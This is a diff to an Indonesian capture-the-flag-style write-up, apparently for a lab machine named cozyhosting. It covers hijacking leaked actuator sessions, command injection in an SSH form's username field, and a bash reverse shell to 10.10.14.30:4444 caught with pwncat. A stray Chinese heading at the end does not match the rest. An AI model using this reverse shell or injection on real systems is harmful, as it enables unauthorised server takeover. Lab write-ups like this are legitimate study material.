@@ -137,6 +137,7 @@ Selain itu saya menemukan endpoint yang cukup unik `/actuator/sessions`, saya me
 ```
 
 ## Exploit
+### Memanfaatkan Leaked Sessions
 
 Saya mencoba memanfaatkan sessions tersebut dengan melakukan manipulasi sesi menggnakan `inspect element`
 ![Screenshot at 2023-09-09 21-36-57](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/b530d0ec-e4ed-460a-88ae-4fb9a1e11d98)
@@ -145,12 +146,29 @@ Saya mencoba memanfaatkan sessions tersebut dengan melakukan manipulasi sesi men
 Disini saya hanya menemukan form untuk koneksi ssh
 ![Screenshot at 2023-09-09 21-32-47](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/f0f08f86-1fff-444e-9aec-336b02ef1761)
 
+### Comand Injection to RCE
 Pada awalnya saya menemukan kejanggalan saat meneliti form tersebut, disini saya menemukan adanya celah `comand injection` pada parameter username
 ![Screenshot at 2023-09-09 21-51-40](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/d65a0897-e4bb-404c-a27f-cbcf5076101d)
 
+Karena saya berhasil melakukan `Comand Injection` lalu tahap berikutnya saya akan melakukan `Reverse Shell` untuk mengambil alih web server tersebut
 
+```bash                                        I      
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.30/4444 0>&1'
+```
+> ini adalah script revershell yang saya gunakan
 
+Saya mendapatkan akses shell sebagai pengguna APP
+```sh
+┌[parrot]─[22:15-09/09]─[~]
+└╼k1r4$pwncat-cs -lp 4444
 
+[22:15:21] Welcome to pwncat 🐈!                                                                         __main__.py:164
+[22:15:42] received connection from 10.129.78.19:40540                                                        bind.py:84
+[22:15:46] 10.129.78.19:40540: registered new host w/ db                                                  manager.py:957
+(local) pwncat$                                                                                                         
+(remote) app@cozyhosting:/app$ 
+```
 
 #### 新的设备特性
 
